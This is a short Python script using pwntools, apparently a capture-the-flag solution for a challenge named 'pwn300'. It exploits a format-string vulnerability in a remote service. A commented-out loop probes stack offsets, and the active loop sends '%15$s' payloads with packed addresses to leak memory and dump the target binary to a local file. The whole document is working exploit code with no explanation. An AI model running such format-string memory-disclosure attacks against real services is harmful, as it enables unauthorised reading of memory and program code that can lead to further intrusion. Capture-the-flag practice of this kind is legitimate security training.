from pwn import *

'''check stack to find stack address
for i in xrange(20, 120):
    p = remote('9a958a70ea8697789e52027dc12d7fe98cad7833.ctf.site', 35000)
    p.recvuntil('key: ')
    p.sendline('0x%' + str(i) + '$08x')
    p.recvuntil('key: ')
    print p.recvline()
    p.close()
'''

# dump binary
addr = 0x410000 # start of the binary

while True:
    print hex(addr)
    p = remote('9a958a70ea8697789e52027dc12d7fe98cad7833.ctf.site', 35000)
    p.recvuntil('key: ')
    p.sendline('%15$sABC' + p32(addr, endian='big'))
    p.recvuntil('key: ')
    l = p.recvuntil('ABC', drop=True) + '\x00'
    addr = addr + len(l)
    # print repr(l)
    open('pwn300.bin', 'ab').write(l)
    p.close()
